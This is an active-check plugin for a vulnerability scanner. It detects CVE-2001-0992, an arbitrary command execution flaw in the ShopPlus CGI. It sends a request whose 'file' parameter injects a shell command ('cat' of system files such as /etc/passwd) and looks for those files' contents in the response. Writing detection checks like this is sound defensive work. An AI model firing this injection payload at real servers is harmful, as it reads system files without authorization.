# SPDX-FileCopyrightText: 2001 SecuriTeam
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10774");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-0992");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("ShopPlus Arbitrary Command Execution Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2001 SecuriTeam");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securiteam.com/unixfocus/5PP021P5FK.html");

  script_tag(name:"summary", value:"The ShopPlus CGI is prone to a vulnerability that allows
  execution of arbitrary commands with the security privileges of the web server.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"Upgdate to the latest version available by contacting the
  author of the program.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

# Converts www.honlolo.hostname.com to hostname.com
function reverse_remove(in_string)
{
 finished = 1;
 first = 1;

 #display("in_string: ", in_string, "\n");
 _ret = "";
 for (count = strlen(in_string)-1; finished;)
 {
  #display("count: ", count, "\n");
  #display("in_string[count]: ", in_string[count], "\n");
  if (in_string[count] == string("."))
  {
   if (first)
   {
    first = 0;
#    display("First\n");
   }
   else
   {
    finished = 0;
   }
  }

  if (finished) _ret = string(in_string[count], _ret);

  if (count > 0)
  {
   count = count - 1;
  }
  else
  {
   finished = 0;
  }

 }

 return (_ret);
}

port = http_get_port( default:80 );

files = traversal_files( "linux" );

hostname = http_host_name( dont_add_port:TRUE );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = dir + "/shopplus.cgi";
  res = http_get_cache( port:port, item:url );
  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    continue;

  fixed_hostname = reverse_remove( in_string:hostname );

  foreach file( keys( files ) ) {

    url = dir + "/shopplus.cgi?dn=" + fixed_hostname + "&cartid=%CARTID%&file=;cat%20/" + files[file] + "|";
    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
